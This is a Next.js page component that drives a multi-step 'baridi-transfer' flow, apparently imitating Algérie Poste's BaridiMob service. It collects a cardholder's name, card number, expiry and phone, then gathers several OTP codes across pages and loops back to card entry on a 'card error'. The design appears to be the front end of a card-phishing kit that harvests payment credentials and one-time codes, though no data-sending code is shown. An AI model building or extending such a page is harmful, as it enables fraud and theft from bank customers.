"use client"

import { useState } from "react"
import { LandingStep } from "@/components/baridi-transfer/landing-step"
import { PaymentInfoStep } from "@/components/baridi-transfer/payment-info-step"
import { CardNumberStep } from "@/components/baridi-transfer/card-number-step"
import { CardDetailsStep } from "@/components/baridi-transfer/card-details-step"
import { OtpVerificationStep } from "@/components/baridi-transfer/otp-verification-step"

export default function HomePage() {
  const [currentStep, setCurrentStep] = useState(0)
  const [formData, setFormData] = useState({
    cardHolderName: "",
    cardNumber: "",
    cardExpiry: "",
    cardPhone: "",
    otpCodes: [] as string[],
    currentOtpPage: 1,
  })

  const updateFormData = (data: Partial<typeof formData>) => {
    setFormData((prev) => ({ ...prev, ...data }))
  }

  const nextStep = () => setCurrentStep((prev) => prev + 1)
  const prevStep = () => setCurrentStep((prev) => prev - 1)
  
  const goToCardDetailsStep = () => {
    setCurrentStep(2)
    setFormData((prev) => ({ ...prev, currentOtpPage: 1 }))
  }

  return (
    <main className="min-h-screen bg-background">
      {/* Step 0: Landing page with info */}
      {currentStep === 0 && <LandingStep onNext={nextStep} />}
      
      {/* Step 1: Payment info and explanation */}
      {currentStep === 1 && (
        <PaymentInfoStep onNext={nextStep} onBack={prevStep} />
      )}
      
      {/* Step 2: Card number entry */}
      {currentStep === 2 && (
        <CardNumberStep 
          onNext={nextStep} 
          onBack={prevStep} 
          formData={formData} 
          updateFormData={updateFormData} 
        />
      )}
      
      {/* Step 3: Card details entry */}
      {currentStep === 3 && (
        <CardDetailsStep 
          onNext={nextStep} 
          onBack={prevStep} 
          formData={formData} 
          updateFormData={updateFormData} 
        />
      )}
      
      {/* Step 4: OTP verification */}
      {currentStep === 4 && (
        <OtpVerificationStep
          onNext={nextStep}
          formData={formData}
          updateFormData={updateFormData}
          onCardError={goToCardDetailsStep}
        />
      )}
    </main>
  )
}
